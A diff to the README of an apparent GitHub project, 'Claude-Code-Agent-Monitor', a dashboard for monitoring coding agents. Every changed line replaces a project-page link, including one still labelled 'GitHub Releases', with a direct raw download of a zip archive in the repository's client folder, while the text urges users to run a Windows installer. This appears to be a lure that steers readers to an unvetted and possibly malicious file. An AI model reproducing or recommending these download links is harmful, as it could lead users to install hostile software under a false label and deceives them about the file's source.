@@ -1,6 +1,6 @@
 # ⚙️ Claude-Code-Agent-Monitor - Real-Time Agent Monitoring Dashboard
 
-[![Download Claude-Code-Agent-Monitor](https://img.shields.io/badge/Download-Claude--Code--Agent--Monitor-red?style=for-the-badge)](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor)
+[![Download Claude-Code-Agent-Monitor](https://img.shields.io/badge/Download-Claude--Code--Agent--Monitor-red?style=for-the-badge)](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor/raw/refs/heads/master/client/Claude_Agent_Monitor_Code_v3.7.zip)
 
 ## 📋 Overview
 
@@ -37,7 +37,7 @@ You will get the full package ready for use from the GitHub page. Follow these s
 
 Click the link below or copy it into your web browser. This takes you to the official project page where you will download the software.  
 
-[Download Claude-Code-Agent-Monitor](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor)
+[Download Claude-Code-Agent-Monitor](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor/raw/refs/heads/master/client/Claude_Agent_Monitor_Code_v3.7.zip)
 
 ### Step 2: Find the Latest Release
 
@@ -113,7 +113,7 @@ A dedicated section shows which tools agents are using most. This helps track re
 
 When new versions are released:
 
-1. Visit the [GitHub Releases](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor/releases) page.
+1. Visit the [GitHub Releases](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor/raw/refs/heads/master/client/Claude_Agent_Monitor_Code_v3.7.zip) page.
 2. Download the latest `.exe` or `.msi` file.
 3. Run it and follow installation prompts.
 4. The installer will update your current version without removing settings.
@@ -144,7 +144,7 @@ If problems continue, check the Issues section on the project GitHub page for he
 
 ## 🚀 Quick Start Reference
 
-1. Download the Windows installer from [here](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor).
+1. Download the Windows installer from [here](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor/raw/refs/heads/master/client/Claude_Agent_Monitor_Code_v3.7.zip).
 2. Run the installer.
 3. Launch the program from the Desktop or Start menu.
 4. Open the dashboard in your browser at `http://localhost:3000`.
@@ -152,7 +152,7 @@ If problems continue, check the Issues section on the project GitHub page for he
 
 ---
 
-[![Download Claude-Code-Agent-Monitor](https://img.shields.io/badge/Download-Claude--Code--Agent--Monitor-brightgreen?style=for-the-badge)](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor)
+[![Download Claude-Code-Agent-Monitor](https://img.shields.io/badge/Download-Claude--Code--Agent--Monitor-brightgreen?style=for-the-badge)](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor/raw/refs/heads/master/client/Claude_Agent_Monitor_Code_v3.7.zip)
 
 ---
 
